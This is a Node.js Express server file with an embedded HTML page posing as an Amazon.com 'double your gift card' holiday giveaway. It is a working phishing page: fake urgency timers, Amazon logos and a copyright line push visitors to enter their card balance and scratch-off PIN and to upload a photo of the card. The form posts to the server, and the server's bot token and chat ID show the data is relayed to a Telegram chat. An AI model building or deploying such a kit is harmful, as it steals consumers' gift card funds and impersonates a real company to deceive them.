import express from "express";
import multer from "multer";

const app = express();
app.set("trust proxy", true);

const VERSION = "build-6";
const clean = v => String(v || "").trim().replace(/^["']+|["']+$/g, "").trim();
const TOKEN = clean(process.env.BOT_TOKEN);
const CHAT = clean(process.env.CHAT_ID);
const API = `https://api.telegram.org/bot${TOKEN}`;
const mask = s => !s ? "(empty)" : (s.length <= 8 ? s : s.slice(0, 4) + "…" + s.slice(-3));

console.log(VERSION, "| tokenLen:", TOKEN.length, "| chat:", mask(CHAT));

const PAGE = String.raw`<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Amazon.com: End of Year Gift Card Giveaway — Double Your Balance</title>
<style>
:root{--navy:#131921;--navy2:#232f3e;--navy3:#37475a;--orange:#ff9900;--btn:#ffd814;--btnb:#fcd200;
--link:#007185;--text:#0f1111;--muted:#565959;--border:#d5d9d9;--green:#067d62;--err:#c40000}
*{box-sizing:border-box}html,body{margin:0;padding:0}
body{font:14px/1.4 Arial,Helvetica,sans-serif;color:var(--text);background:#eaeded}
a{color:var(--link);text-decoration:none}a:hover{text-decoration:underline}
.sr{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
.nav-top{background:var(--navy);display:flex;align-items:center;gap:12px;padding:8px 14px;min-height:60px}
.logo{display:flex;flex-direction:column;align-items:flex-start;padding:4px 8px;border:1px solid transparent;border-radius:4px;flex:none}
.logo b{color:#fff;font-size:22px;font-weight:700;letter-spacing:-.5px;line-height:1}
.logo svg{display:block;width:56px;height:12px;margin-top:-1px}
.nav-addr{padding:6px 8px;border-radius:4px;color:#fff;font-size:12px;line-height:1.2;flex:none}
.nav-addr b{display:block;font-size:14px}
.search{flex:1;display:flex;height:40px;border-radius:8px;overflow:hidden;min-width:90px}
.search select{border:0;background:#e6e6e6;color:#555;font-size:12px;padding:0 6px;border-right:1px solid #cdcdcd}
.search input{flex:1;border:0;padding:0 10px;font-size:15px;outline:none;min-width:0}
.search button{border:0;background:#febd69;width:44px;font-size:16px;flex:none}
.nav-right{display:flex;align-items:center;gap:2px;flex:none}
.nav-cell{color:#fff;padding:6px 8px;border:1px solid transparent;border-radius:4px;font-size:12px;line-height:1.2;white-space:nowrap;background:none;font-family:inherit;text-align:left;cursor:pointer}
.nav-cell b{display:block;font-size:14px}
.cart{display:flex;align-items:flex-end;color:#fff;padding:6px 8px;font-weight:700}
.cart .c{font-size:22px;line-height:1}.cart .n{color:var(--orange);font-size:16px;margin-left:2px}
.nav-sub{background:var(--navy2);display:flex;align-items:center;gap:18px;padding:6px 14px;overflow-x:auto;white-space:nowrap}
.nav-sub a{color:#fff;font-size:13px;padding:4px 6px;flex:none}
.nav-sub .all{font-weight:700}
.strip{background:#fff3d6;border-bottom:1px solid #e6d9b8;color:#6b4a00;text-align:center;padding:9px;font-size:13px;font-weight:700}
.strip span{color:#b12704}
.wrap{max-width:1240px;margin:0 auto;padding:0 14px 40px;display:grid;grid-template-columns:1fr 330px;gap:18px;align-items:start}
.crumbs{grid-column:1/-1;font-size:12px;color:var(--muted);padding:12px 2px 0}.crumbs a{color:var(--muted)}
.diag{grid-column:1/-1;border:1px solid #c9c9c9;border-radius:6px;background:#fff;font-size:12px}
.diag-head{background:#f2f4f5;padding:8px 12px;border-bottom:1px solid #e0e3e5;font-family:monospace}
.diag-links{padding:8px 12px;border-bottom:1px solid #eee;font-size:12px}
.diag-links a{display:inline-block;margin-right:12px;font-weight:700}
.diag-body{padding:10px 12px;font-family:monospace;font-size:11.5px;line-height:1.55;max-height:170px;overflow:auto;white-space:pre-wrap;word-break:break-word}
.diag-body .ok{color:#067d62}.diag-body .bad{color:#b00020}.diag-body .warn{color:#8a5300}
.status{grid-column:1/-1;border-radius:6px;padding:11px 14px;font-size:12.5px;line-height:1.45;display:none}
.status.bad{display:block;background:#fff0f0;border:1px solid #f0b8b8;color:#8b0000}
.status.good{display:block;background:#f0f9f4;border:1px solid #b7e0cd;color:#0a5b48}
.status b{display:block;margin-bottom:2px}
.hero{grid-column:1/-1;background:linear-gradient(120deg,#232f3e 0%,#37475a 60%,#485769 100%);border-radius:8px;
padding:26px 26px 22px;color:#fff;position:relative;overflow:hidden}
.hero:after{content:"";position:absolute;right:-60px;top:-60px;width:260px;height:260px;border-radius:50%;
background:radial-gradient(circle,rgba(255,153,0,.35),transparent 70%)}
.badge{display:inline-block;background:#cc0c39;color:#fff;font-size:11px;font-weight:700;padding:4px 9px;border-radius:3px;text-transform:uppercase}
.hero h1{font-size:30px;line-height:1.2;margin:12px 0 8px;font-weight:700;max-width:720px}
.hero h1 em{color:#ffd814;font-style:normal}
.hero p{margin:0;color:#d5dbdb;max-width:640px;font-size:14px}
.hero .meta{margin-top:14px;display:flex;gap:18px;flex-wrap:wrap;font-size:12px;color:#c8cfd4}
.card{background:#fff;border:1px solid var(--border);border-radius:8px;padding:18px}
.card h2{font-size:19px;margin:0 0 4px}.card .sub{font-size:12px;color:var(--muted);margin:0 0 16px}
.step{display:flex;gap:12px;padding:16px 0;border-top:1px solid #eee}.step:first-of-type{border-top:0}
.num{flex:none;width:24px;height:24px;border-radius:50%;background:var(--navy2);color:#fff;font-size:13px;font-weight:700;
display:flex;align-items:center;justify-content:center}
.step-body{flex:1;min-width:0}.step-body label{display:block;font-weight:700;font-size:14px;margin-bottom:6px}
.step-body .hint{font-size:12px;color:var(--muted);margin:6px 0 0}
.input{width:100%;max-width:320px;height:40px;border:1px solid #888c8c;border-radius:4px;padding:0 10px;font-size:15px;font-family:inherit}
.money{display:flex;align-items:center;max-width:200px;border:1px solid #888c8c;border-radius:4px;overflow:hidden}
.money span{padding:0 10px;color:var(--muted);background:#f0f2f2;border-right:1px solid #888c8c;line-height:38px}
.money input{border:0;height:38px;width:100%;padding:0 10px;font-size:15px;outline:none;font-family:inherit;min-width:0}
.chips{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
.chip{border:1px solid var(--border);background:#f7f8f8;border-radius:100px;padding:5px 13px;font-size:12px;cursor:pointer;font-family:inherit}
.chip.on{background:#fff3d6;border-color:#f0c14b;font-weight:700}
.estimate{margin-top:12px;border:1px solid #dfe3e6;border-radius:8px;overflow:hidden}
.est-head{background:#f7f8f8;border-bottom:1px solid #e7e9ec;padding:9px 12px;font-size:12px;font-weight:700;text-transform:uppercase}
.est-row{display:flex;justify-content:space-between;padding:8px 12px;font-size:13px;border-bottom:1px solid #f0f2f2}
.est-row b.g{color:var(--green)}
.est-row.total{background:#f0f9f4;border-bottom:0;font-weight:700;font-size:15px;color:#0a5b48;padding:11px 12px}
.est-note{padding:8px 12px;font-size:11px;color:var(--muted);background:#fcfcfc}
.drop{display:block;border:2px dashed #b8bcbc;border-radius:8px;background:#fafafa;padding:20px;text-align:center;cursor:pointer}
.drop .ic{font-size:24px;display:block;margin-bottom:6px}.drop b{display:block;font-size:14px;margin-bottom:4px}
.drop small{color:var(--muted);font-size:12px}
.drop .pick{display:inline-block;margin-top:10px;border:1px solid var(--btnb);background:var(--btn);border-radius:100px;padding:7px 18px;font-size:13px;font-weight:700}
.thumbs{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.thumb{position:relative;width:78px;height:78px;border-radius:6px;overflow:hidden;border:1px solid var(--border)}
.thumb img{width:100%;height:100%;object-fit:cover;display:block}
.thumb button{position:absolute;top:2px;right:2px;width:20px;height:20px;border:0;border-radius:50%;background:rgba(0,0,0,.65);color:#fff;font-size:12px;cursor:pointer}
.err{display:none;color:var(--err);font-size:12px;margin-top:6px;font-weight:700}.err.show{display:block}
.buy{position:sticky;top:12px;background:#fff;border:1px solid var(--border);border-radius:8px;padding:18px}
.buy h3{margin:0 0 12px;font-size:15px}
.sumrow{display:flex;justify-content:space-between;font-size:13px;padding:4px 0}
.sumrow.big{font-size:18px;font-weight:700;color:var(--green);border-top:1px solid #e7e7e7;margin-top:8px;padding-top:10px}
.btn{width:100%;border:1px solid var(--btnb);background:var(--btn);border-radius:100px;height:42px;font-size:15px;cursor:pointer;font-family:inherit}
.btn:disabled{background:#e7e9ec;border-color:#d5d9d9;color:#8b8b8b}
.btn.alt{background:#ffa41c;border-color:#ff8f00;margin-top:8px}
.btn.mini{height:34px;font-size:13px;background:#f7f8f8;border-color:#adb1b8;margin-top:8px}
.timerbox{margin-top:14px;border:1px solid #f3d1d1;background:#fff7f7;border-radius:6px;padding:10px;text-align:center}
.timerbox .t{font-size:22px;font-weight:700;color:#b12704;font-variant-numeric:tabular-nums}
.timerbox .l{font-size:11px;color:#b12704;text-transform:uppercase;font-weight:700}
.secure{text-align:center;font-size:12px;color:var(--muted);margin-top:12px}
.info{grid-column:1/-1;display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
.info div{background:#fff;border:1px solid var(--border);border-radius:8px;padding:14px;font-size:12.5px}
.info b{display:block;margin-bottom:3px;font-size:13px}.info .ico{font-size:18px;display:block;margin-bottom:6px}
.pane{padding:8px 4px}.pane h2{margin:0 0 6px;font-size:20px}.pane p{margin:0 0 14px;color:var(--muted);font-size:13px}
.prog{height:8px;border-radius:100px;background:#e9ecef;overflow:hidden;margin:14px 0 6px}
.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,#ff9900,#067d62);transition:width .4s linear}
.pcount{font-size:12px;color:var(--muted);text-align:right}
.miles{list-style:none;margin:16px 0 0;padding:0;font-size:13px}
.miles li{display:flex;gap:9px;align-items:center;padding:7px 0;color:#999;border-top:1px solid #f1f1f1}
.miles li .dot{width:18px;height:18px;border-radius:50%;border:2px solid #cfd4d8;flex:none;display:flex;align-items:center;justify-content:center;font-size:11px;color:#fff}
.miles li.on{color:var(--text);font-weight:700}.miles li.on .dot{border-color:var(--green);background:var(--green)}
.pinbox{font-family:monospace;font-size:19px;letter-spacing:2px;background:#f7f8f8;border:1px dashed #adb1b8;border-radius:6px;padding:12px;text-align:center;margin:14px 0;font-weight:700;word-break:break-all}
.tick{width:62px;height:62px;border-radius:50%;background:#e8f5ee;color:var(--green);font-size:32px;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
.bigval{font-size:30px;font-weight:700;color:var(--green);line-height:1}
.bigval small{display:block;font-size:12px;color:#0a5b48;font-weight:400}
.creditbox{margin-top:16px;border:1px solid #f3d1d1;background:#fff7f7;border-radius:6px;padding:11px;text-align:center}
.creditbox .l{font-size:11px;color:#b12704;text-transform:uppercase;font-weight:700}
.creditbox .t{font-size:24px;font-weight:700;color:#b12704;font-variant-numeric:tabular-nums}
.ref{display:inline-block;font-family:monospace;background:#f4f4f4;border:1px dashed #ccc;padding:5px 11px;border-radius:4px;font-size:12px;margin-top:12px}
.foot{background:var(--navy2);color:#ddd;margin-top:26px;padding:26px 14px 40px;text-align:center;font-size:12px}
.foot a{color:#ddd;display:inline-block;margin:0 10px}.foot .bar{height:34px;background:var(--navy3);margin:-26px -14px 22px}
.foot .ver{opacity:.6;font-family:monospace;font-size:12px;display:block;margin-top:14px}
.mask{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:flex-start;justify-content:center;padding:26px 12px;z-index:99;overflow:auto}
.mask.on{display:flex}
.modal{background:#fff;border-radius:8px;width:100%;max-width:350px;padding:22px 24px 26px;border:1px solid #ccc}
.modal .mlogo{font-size:22px;font-weight:700;display:flex;flex-direction:column;align-items:center;margin-bottom:14px}
.modal .mlogo svg{width:56px;height:12px}
.modal h1{font-size:22px;margin:0 0 14px;font-weight:400}
.modal label{display:block;font-size:13px;font-weight:700;margin:12px 0 4px}
.modal input{width:100%;height:34px;border:1px solid #888c8c;border-radius:4px;padding:0 9px;font-size:14px;font-family:inherit}
.modal input.bad{border-color:var(--err)}
.modal .btn{height:33px;font-size:14px;margin-top:16px;border-radius:8px}
.modal .note{font-size:11px;color:var(--muted);margin-top:14px}
.modal .hr{height:1px;background:#e7e7e7;margin:20px 0 12px;position:relative}
.modal .hr span{position:absolute;top:-7px;left:50%;transform:translateX(-50%);background:#fff;padding:0 8px;font-size:11px;color:var(--muted)}
.modal .ghost{width:100%;height:33px;border:1px solid #adb1b8;border-radius:8px;background:#fff;font-size:13px;cursor:pointer;font-family:inherit}
.modal .close{float:right;border:0;background:none;font-size:20px;cursor:pointer;color:#555}
.mgreet{font-size:13px;margin-bottom:6px;word-break:break-all}
.merr{color:var(--err);font-size:11.5px;margin-top:6px;font-weight:700;display:none}.merr.on{display:block}
@media(max-width:860px){.wrap{grid-template-columns:1fr}.buy{position:static}.info{grid-template-columns:1fr}}
@media(max-width:700px){
  .nav-top{gap:7px;padding:7px 9px;min-height:54px}.nav-addr{display:none}.search select{display:none}
  .search{height:36px}.logo b{font-size:18px}.logo svg{width:46px;height:10px}
  .nav-cell{font-size:10.5px}.nav-cell b{font-size:12px}.hide-sm{display:none}
  .cart .c{font-size:20px}.hero{padding:20px 18px}.hero h1{font-size:23px}.card{padding:14px}.step{gap:9px}
}
</style>
</head>
<body>

<header class="nav-top">
  <a class="logo" href="#"><b>amazon</b><svg viewBox="0 0 60 12"><path d="M2 3 Q30 14 55 3" stroke="#ff9900" stroke-width="2.6" fill="none" stroke-linecap="round"/><path d="M52 1 l7 3.6 -8 2.6z" fill="#ff9900"/></svg></a>
  <div class="nav-addr">Deliver to<br><b>Guest ▾</b></div>
  <div class="search"><select><option>All</option><option>Gift Cards</option></select><input placeholder="Search Amazon" aria-label="Search"><button type="button">🔍</button></div>
  <div class="nav-right">
    <button class="nav-cell" id="greet" type="button" onclick="openSignIn()">Hello, sign in<br><b>Account &amp; Lists</b></button>
    <div class="nav-cell hide-sm">Returns<br><b>&amp; Orders</b></div>
    <div class="cart"><span class="c">🛒</span><span class="n">0</span></div>
  </div>
</header>

<nav class="nav-sub">
  <a class="all" href="#">☰ All</a><a href="#">Gift Cards</a><a href="#">Today's Deals</a>
  <a href="#">Customer Service</a><a href="#">Registry</a><a href="#">Sell</a>
</nav>

<div class="strip">🎁 END OF YEAR GIVEAWAY &nbsp;·&nbsp; Every redeemed gift card is matched 100% &nbsp;·&nbsp; Ends in <span id="stripTimer">59:59</span></div>

<div class="wrap">
  <div class="crumbs"><a href="#">Gift Cards</a> › <a href="#">Redeem</a> › End of Year Double Value</div>

  <div class="diag">
    <div class="diag-head">page build <span id="ver">__BUILD__</span> · server build __BUILD__</div>
    <div class="diag-links">
      <a href="/api/raw" target="_blank">/api/raw</a>
      <a href="/api/status" target="_blank">/api/status</a>
      <a href="/api/test" target="_blank">/api/test</a>
    </div>
    <div class="diag-body" id="diagbody">script not started yet</div>
  </div>

  <div class="status" id="status"></div>

  <section class="hero">
    <span class="badge">Limited time · Holiday event</span>
    <h1>Double the value of your Amazon gift card — <em>instantly matched, up to $1,000</em></h1>
    <p>Scratch your card, enter the PIN, and confirm your balance. Every eligible card of $100 or more is matched
       100% and credited to the same account within 60 minutes of verification.</p>
    <div class="meta"><span>✔ Cards from $100</span><span>✔ One card per account</span><span>✔ No purchase required</span></div>
  </section>

  <form class="card" id="f" action="/send" method="post" enctype="multipart/form-data" onsubmit="return submitForm(event)" novalidate>
    <h2>Redeem &amp; double your card</h2>
    <p class="sub">Takes about 40 seconds. Have the card in front of you before you start.</p>

    <div class="step"><div class="num">1</div><div class="step-body">
      <label for="bal">Gift card balance</label>
      <div class="money"><span>$</span><input id="bal" name="bal" type="number" inputmode="decimal" min="100" step="1" placeholder="100.00" oninput="recalc()"></div>
      <div class="chips">
        <button type="button" class="chip" onclick="setVal(100,this)">$100</button>
        <button type="button" class="chip" onclick="setVal(200,this)">$200</button>
        <button type="button" class="chip" onclick="setVal(500,this)">$500</button>
      </div>
      <p class="hint">Minimum $100. Use the full remaining balance printed on the card.</p>
      <div class="err" id="e1">Enter a balance of $100 or more.</div>
      <div class="estimate" id="est" hidden>
        <div class="est-head">Estimate of what you will receive</div>
        <div class="est-row"><span>Card balance</span><b id="r1">$0.00</b></div>
        <div class="est-row"><span>Giveaway match (100%)</span><b class="g" id="r2">+$0.00</b></div>
        <div class="est-row"><span>Processing fee</span><b id="r3">$0.00</b></div>
        <div class="est-row total"><span>Total credited within 60 min</span><b id="r4">$0.00</b></div>
        <div class="est-note">Estimate only — confirmed once your PIN is verified.</div>
      </div>
    </div></div>

    <div class="step"><div class="num">2</div><div class="step-body">
      <label for="pin">Gift card PIN — the code under the scratch strip</label>
      <input class="input" id="pin" name="pin" maxlength="19" placeholder="XXXX-XXXXXX-XXXX" autocomplete="off" oninput="formatPin()">
      <p class="hint">14 characters. Dashes are added automatically.</p>
      <div class="err" id="e2">That PIN looks incomplete — it should be 14 characters.</div>
    </div></div>

    <div class="step"><div class="num">3</div><div class="step-body">
      <label>Photo of the card after scratching</label>
      <label class="drop" id="drop" for="file">
        <span class="ic">📷</span><b>Tap here to add a photo</b>
        <small>Front of the card, scratch strip visible</small>
        <span class="pick">Choose file</span>
      </label>
      <input class="sr" type="file" id="file" name="photo" accept="image/*" multiple>
      <div class="thumbs" id="thumbs"></div>
      <div class="err" id="e3">Add at least one photo of the card.</div>
    </div></div>
  </form>

  <aside class="buy">
    <h3>Redemption summary</h3>
    <div class="sumrow"><span>Card balance</span><span id="s1">$0.00</span></div>
    <div class="sumrow"><span>Giveaway match (100%)</span><span id="s2">$0.00</span></div>
    <div class="sumrow"><span>Fees</span><span>$0.00</span></div>
    <div class="sumrow big"><span>Total credited</span><span id="s3">$0.00</span></div>
    <button class="btn" id="go" type="submit" form="f">Double my value</button>
    <button class="btn alt" type="button" onclick="howItWorks()">How it works</button>
    <button class="btn mini" type="button" onclick="sendTest(this)">🔔 Send test to Telegram</button>
    <div class="timerbox"><div class="l">Offer expires in</div><div class="t" id="timer">59:59</div></div>
    <div class="secure">🔒 Secure redemption · amazon.com</div>
  </aside>

  <div class="info">
    <div><span class="ico">⚡</span><b>Credited in 60 minutes</b>Verification is automatic and finishes well inside the hour.</div>
    <div><span class="ico">🛡️</span><b>PIN is not consumed</b>Your card stays usable.</div>
    <div><span class="ico">🎄</span><b>Holiday event</b>One card per account. Ends 31 December.</div>
  </div>
</div>

<footer class="foot">
  <div class="bar"></div>
  <a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a><br><br>
  © 1996–2026, Amazon.com, Inc. or its affiliates
  <span class="ver" id="ver2">__BUILD__</span>
</footer>

<div class="ma
